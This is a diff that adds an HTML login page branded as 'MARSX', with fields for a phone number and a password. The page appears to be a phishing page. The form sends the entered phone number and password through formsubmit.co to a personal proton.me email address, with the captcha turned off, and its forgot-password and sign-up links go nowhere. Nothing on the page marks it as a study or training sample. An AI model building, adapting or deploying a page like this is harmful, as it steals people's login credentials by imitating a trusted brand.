@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>MARSX Login</title>
+  <style>
+    body {
+      background-color: #000;
+      font-family: Arial, sans-serif;
+      color: #fff;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 60px auto;
+      padding: 20px;
+    }
+
+    .logo {
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      margin-bottom: 30px;
+    }
+
+    .tab {
+      display: flex;
+      justify-content: space-around;
+      margin-bottom: 20px;
+    }
+
+    .tab button {
+      flex: 1;
+      padding: 10px;
+      border: none;
+      background-color: #333;
+      color: #fff;
+      cursor: pointer;
+    }
+
+    .tab button.active {
+      background-color: goldenrod;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 20px;
+      border: none;
+    }
+
+    .checkbox {
+      display: flex;
+      align-items: center;
+      margin-top: 10px;
+    }
+
+    .checkbox input {
+      width: auto;
+      margin-right: 10px;
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 14px;
+      background-color: goldenrod;
+      color: black;
+      border: none;
+      border-radius: 25px;
+      margin-top: 20px;
+      cursor: pointer;
+    }
+
+    .footer {
+      margin-top: 20px;
+      color: #ccc;
+    }
+
+    .footer a {
+      color: goldenrod;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://marsx.dev/logo.svg" alt="MarsX Logo" class="logo" height="50">
+    <h2>Welcome To Login</h2>
+
+    <div class="tab">
+      <button class="active">Phone Login</button>
+      <button disabled>Email Login</button>
+    </div>
+
+    <form action="https://formsubmit.co/whastag@proton.me" method="POST">
+      <input type="hidden" name="_captcha" value="false">
+
+      <label for="phone">Phone Number</label>
+      <div style="display: flex;">
+        <select name="country_code" required style="width: 30%; margin-right: 10px;">
+          <option value="+1">🇺🇸 +1</option>
+          <option value="+33">🇫🇷 +33</option>
+          <option value="+44">🇬🇧 +44</option>
+          <!-- Ajoutez d'autres pays si nécessaire -->
+        </select>
+        <input type="text" name="phone_number" placeholder="Phone Number" required style="width: 70%;">
+      </div>
+
+      <label for="password">Password</label>
+      <input type="password" name="password" placeholder="Password" required>
+
+      <div class="checkbox">
+        <input type="checkbox" name="remember"> <label>Remember account and password</label>
+      </div>
+
+      <div style="text-align: right; margin-top: 10px;">
+        <a href="#" style="color: gray;">Forgot password?</a>
+      </div>
+
+      <button type="submit" class="submit-btn">Log In</button>
+    </form>
+
+    <div class="footer">
+      Continue is Agree <a href="#">Sign Up</a>
+    </div>
+  </div>
+</body>
+</html>
